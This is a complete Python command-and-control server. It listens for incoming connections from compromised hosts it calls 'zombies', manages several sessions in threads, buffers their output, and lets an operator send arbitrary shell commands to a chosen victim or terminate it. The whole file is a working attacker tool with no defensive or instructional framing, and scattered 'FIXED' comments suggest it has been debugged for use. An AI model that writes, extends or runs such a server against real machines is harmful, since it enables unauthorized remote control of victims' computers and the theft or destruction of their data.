#!/usr/bin/python3
import socket
import sys
import threading
import time
import uuid
import select

#Blueprint for zombie connecting to our c2
class Zombie:
    def __init__(self, client_socket, client_address):
        self.id=str(uuid.uuid4())[:8]  # Short unique ID
        self.socket=client_socket
        self.address=client_address
        self.connected=True
        self.receive_thread=None
        self.output_buffer=[]

#Handles zombie interaction
class C2Server:
    def __init__(self, port=4444):
        self.port=port
        self.zombies={}  #zombie_id--> zombie object
        self.current_zombie=None
        self.running=True
        self.listener_thread=None
    
    def receive_output(self, zombie):
        """Separate thread to continously receive and display ouput for a specific zombie"""

        while zombie.connected:
            try:
                #Use select to check if data is available
                ready=select.select([zombie.socket], [], [], 0.1)

                if ready[0]:
                    data = zombie.socket.recv(4096)
                    if not data:
                        break
                    output=data.decode('utf-8', errors='ignore')

                    if self.current_zombie==zombie.id:
                        #if we're currently interacting with this zombie print output

                        print(output, end='')
                        sys.stdout.flush()
                    else:
                        #otherwise, buffer the output for later viewing
                        zombie.output_buffer.append(output)
            
            except Exception as e:
                if zombie.connected:
                    #only print error if we didnt intentionally disconnect
                    print(f"\n[-] Error receiving from {zombie.id}: {e}")
                    break

        #Mark zombie as disconnected
        zombie.connected=False
        if self.current_zombie==zombie.id:
            self.current_zombie=None
            print(f"\n[-]Zombie {zombie.id} disconnected")

    def start_listener(self):
        """Main listener thread that accepts new connections"""
        try:
            sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', self.port))  # FIXED: bind not binf
            sock.listen(5)

            print(f"[+] C2 Server listening on port: {self.port}")
            print("[+]Type 'help' for available commands")

            while self.running:
                try:
                    #Use select with timeout to allow checking self.running
                    ready=select.select([sock], [], [], 1.0)
                    if ready[0]:
                        client_socket, client_address=sock.accept()
                        self.add_zombie(client_socket, client_address)
                    
                except socket.timeout:
                    continue

                except Exception as e:
                    if self.running:
                        print(f"[-]Listener error: {e}")
        
        except Exception as e:
            print(f"[-] Listener fatal error: {e}")

    def add_zombie(self, client_socket, client_address):
        """Add a new zombie to our collection"""
        #create an object based on the zombie class
        zombie=Zombie(client_socket, client_address)
        self.zombies[zombie.id]=zombie

        #Start receiver thread for this zombie
        zombie.receive_thread=threading.Thread(
            target=self.receive_output,
            args=(zombie,)
        )
        zombie.receive_thread.daemon=True  # ADDED: Set as daemon
        zombie.receive_thread.start()      # ADDED: Start the thread

        print(f"[+] New Zombie connected: {zombie.id} from {client_address}")

    def list_zombies(self):
        """Display all connected zombies"""
        if not self.zombies:
            print("[-]No zombies connected")
            return 

        print("\n"+"="*50)
        print("ID       | Address           | Status")
        print("-"*50)

        for zombie_id, zombie in self.zombies.items():
            status="Active" if zombie.connected else "Dead"
            current=" *"if self.current_zombie==zombie_id else ""
            print(f"{zombie_id} | {zombie.address[0]:15}:{zombie.address[1]} | {status}{current}")

        print("="*50)  # FIXED: Moved outside the loop
        
    def interact_with_zombie(self, zombie_id):
        """interact with a specific zombie"""
        if zombie_id not in self.zombies:
            print(f"[-] Zombie {zombie_id} is not connected")
            return False
        
        zombie = self.zombies[zombie_id]

        if not zombie.connected:
            print(f"[-]Zombie {zombie_id} is not connected")
            return False
        
        self.current_zombie=zombie_id
        print(f"[+]Interacting with zombie {zombie_id} ({zombie.address})")
        print("Type 'background' to return to main menu")

        #print ant buffered output
        if zombie.output_buffer:
            print("\n[Buffered output:]")
            for output in zombie.output_buffer:
                print(output, end='')
            zombie.output_buffer.clear()

        return True
    
    def background_session(self):
        """Background the current session"""
        if self.current_zombie:
            print(f"[+] Backgrounding zombie {self.current_zombie}")
            self.current_zombie=None
    
    def send_command(self, command):
        """send command to current zombie"""
        if not self.current_zombie:
            print("[-] Not interacting with any zombie")
            return 
        
        zombie=self.zombies.get(self.current_zombie)
        if not zombie or not zombie.connected:
            print(f"[-]Zombie {self.current_zombie} is not connected")
            self.current_zombie=None
            return
        
        try:
            zombie.socket.send((command + '\n').encode())
            time.sleep(0.1)

        except Exception as e:
            print(f"[-] Error sending command: {e}")
            zombie.connected=False
            self.current_zombie=None

    def show_help(self):
        """Display help menu"""
        print("\n" + "="*50)
        print("C2 SERVER COMMANDS")
        print("="*50)
        print("zombies               - List all connected zombies")
        print("interact <zombie_id>  - Interact with specific zombie")
        print("background            - Background current session")
        print("kill <zombie_id>      - Terminate zombie connection")
        print("clear                 - Clear screen")
        print("help                  - Show this help menu")
        print("exit                  - Shutdown C2 server")
        print("="*50)    


    def cleanup_zombies(self):
        """Remove disconnected zombies"""
        dead_zombies=[]

        for zombie_id, zombie in self.zombies.items():
            if not zombie.connected:
                dead_zombies.append(zombie_id)

        for zombie_id in dead_zombies:
            del self.zombies[zombie_id]
        
    def run(self):
        """Main C2 server loop"""
        #Start listener thread
        self.listener_thread=threading.Thread(target=self.start_listener)
        self.listener_thread.daemon=True
        self.listener_thread.start()

        while self.running:
            try:
                #show appropriate prompt
                if self.current_zombie:
                    prompt=f"Zombie[{self.current_zombie}]> "
                else:
                    prompt="C2> "
                
                command=input(prompt).strip()

                if not command:
                    continue

                #Handle commands based on context
                if self.current_zombie:
                    #We're in zombie interact mode
                    if command.lower()=='background':
                        self.background_session()
                    else:
                        self.send_command(command)
                else:
                    #We're in main c2 mode
                    if command.lower()=='exit':
                        self.running=False
                        print("[+]Shutting down C2....")
                    
                    elif command.lower()=='zombies':
                        self.list_zombies()
                    
                    elif command.lower().startswith('interact '):
                        #get the zombie ID
                        zombie_id=command.split(' ', 1)[1]
                        self.interact_with_zombie(zombie_id)
                    
                    elif command.lower().startswith('kill '):
                        zombie_id=command.split(' ', 1)[1]
                        self.kill_zombie(zombie_id)

                    elif command.lower()=='clear':
                        print("\033[H\033[J")  #clear screen
                    
                    elif command.lower()=='help':
                        self.show_help()
                    
                    else:
                        print(f"[-] Unknown Command: {command}")
                        print("[-]Type 'help' for available commands")

                #cleanup dead zombies periodically  # FIXED: Proper indentation
                self.cleanup_zombies()

            except KeyboardInterrupt:
                if self.current_zombie:
                    print("\n[!] Use 'background' to return to main menu")
                else:
                    print("\n[!] Use 'exit' to shutdown server")
            
            except EOFError:
                print("\n[!] Exiting....")
                self.running=False
            
            except Exception as e:
                print(f"[-]Error: {e}")

    def kill_zombie(self, zombie_id):  # FIXED: Removed extra spaces
        """Kill a zombie connection"""
        if zombie_id in self.zombies:
            zombie=self.zombies[zombie_id]
            zombie.connected=False
            try:
                zombie.socket.close()
            except:
                pass

            if self.current_zombie==zombie_id:  # FIXED: self not select
                self.current_zombie=None
            
            del self.zombies[zombie_id]
            print(f"[-]Zombie {zombie_id} terminated")
        else:
            print(f"[-] Zombie {zombie_id} not found")

if __name__=='__main__':
    port = int(sys.argv[1]) if len(sys.argv)>1 else 4444
    server=C2Server(port)
    server.run()